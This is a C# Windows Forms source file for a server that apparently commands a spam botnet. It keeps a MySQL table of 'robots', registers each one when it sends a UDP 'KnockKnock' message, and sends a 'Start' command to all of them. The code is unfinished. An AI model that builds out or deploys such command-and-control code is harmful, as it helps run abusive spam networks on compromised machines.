using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using MySql.Data;
using MySql.Data.MySqlClient;
using ServerApp.Properties;
using System.Reflection;

namespace ServerApp
{
	public enum SpamLanguage
	{
		KnockKnock,//c
		Start,//s
		Stop,//s
	}

	public struct Letter
	{
		public string Subject;
		public string Body;
		public int IsHtml;
		//public Letter(string subject, string body, in)
	}

	public partial class FormServer : Form
	{
		#region const strings

		public const string selectValidHostnamesQuery =
@"SELECT
	Hostname
FROM
	robots
WHERE
	(Hostname <> '0.0.0.0') AND
	(Hostname <> '255.255.255.255')";

		public const string connectionStrFormat =
			"server={0};user id={1}; password={2}; database={3}; pooling=false";

		#endregion

		UdpClient udpClient;
		MySqlConnection sqlConnection;
		Settings sets = Settings.Default;

		public FormServer()
		{
			InitializeComponent();

			#region Open UDP client
			try
			{
				udpClient = new UdpClient(sets.RobotUdpPort);
				udpClient.BeginReceive(Priem, new object());
			}
			catch ( SocketException exc )
			{
				MessageBox.Show("Cannot open UDP socket.\r\n" +
					"Port: " + sets.RobotUdpPort.ToString() + "\r\n" +
					exc.Message);
				return;
			}
			#endregion

			OpenSqlConnection();

			//textBox1.Clear();
			//foreach ( string robot in GetRobotHosts() )
			//    textBox1.Text += Environment.NewLine + robot;
		}

		private void OpenSqlConnection()
		{
			if ( sqlConnection != null )
				sqlConnection.Close();

			string connectionStr = String.Format(connectionStrFormat,
				sets.DbHost, sets.DbUser, sets.DbPassword, sets.DbName);

			try
			{
				sqlConnection = new MySqlConnection(connectionStr);
				sqlConnection.Open();
			}
			catch ( MySqlException ex )
			{
				MessageBox.Show(ex.Message, "Error connecting to the db server");
				return;
			}
		}

		private IEnumerable<string> GetRobotHosts()
		{
			if ( sqlConnection.State != System.Data.ConnectionState.Open )
			{ yield break; }

			MySqlCommand sqlCmd =
				new MySqlCommand(selectValidHostnamesQuery, sqlConnection);
			MySqlDataReader sqlReader = sqlCmd.ExecuteReader();

			while ( sqlReader.Read() )
				yield return sqlReader.GetString(0);
		}

		private void buttonSend_Click(object sender, EventArgs e)
		{
			SendStartToAll();
		}

		private void SendStartToAll()
		{
			int roborPort = sets.RobotUdpPort;

			foreach ( string robotHost in GetRobotHosts() )
			{
				try
				{
					Say(robotHost, roborPort, SpamLanguage.Start);
				}
				catch ( Exception exc )
				{
					MessageBox.Show(exc.Message);
					continue;
				}
			}
		}

		void Priem(IAsyncResult iar)
		{
			IPEndPoint remoteIPEndPoint = null;

			byte[] bytes = udpClient.EndReceive(iar, ref remoteIPEndPoint);

			SpamLanguage verb = (SpamLanguage)bytes[0];

			switch ( verb )
			{
			case SpamLanguage.KnockKnock:
				AddRobot(remoteIPEndPoint.Address.ToString());
				break;
			default:
				MessageBox.Show("Incorrect command received");
				break;
			}

			udpClient.BeginReceive(Priem, iar);
		}

		private void AddRobot(string ip)
		{
			if ( sqlConnection.State == System.Data.ConnectionState.Open )
			{
				//sqlConnection.
			}
		}

		private void Say(string Host, int Port, SpamLanguage cmd)
		{
			byte[] dgrm = new byte[] { (byte)cmd };

			UdpClient uclient = new UdpClient(Host, Port);
			uclient.Send(dgrm, dgrm.Length);
			uclient.Close();
		}

		private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FormOptions fOpts = new FormOptions();
			fOpts.Show();
		}
	}
}